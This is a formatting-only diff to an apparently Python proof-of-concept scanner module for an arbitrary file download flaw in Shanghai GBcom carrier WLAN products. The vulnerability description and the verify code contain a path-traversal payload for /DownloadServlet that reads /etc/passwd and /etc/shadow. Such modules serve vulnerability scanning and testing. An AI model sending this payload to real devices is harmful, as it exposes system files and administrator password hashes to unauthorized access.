@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'GBcom_0001'  # 平台漏洞编号，留空
     name = '上海寰创运营商WLAN产品任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-06-17'  # 漏洞公布时间
     desc = '''
         上海寰创运营商WLAN产品 /DownloadServlet?fileName=../../etc/shadow 任意文件下载（可直接获取管理员账号密码等）。
@@ -18,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '上海寰创运营商WLAN'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'f87a6b1d-7252-4f7e-b490-a11596a0cdeb'
@@ -32,7 +35,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2010-0121010
+            # refer: http://www.wooyun.org/bugs/wooyun-2010-0121010
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/DownloadServlet?fileName=../../etc/passwd'
@@ -48,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
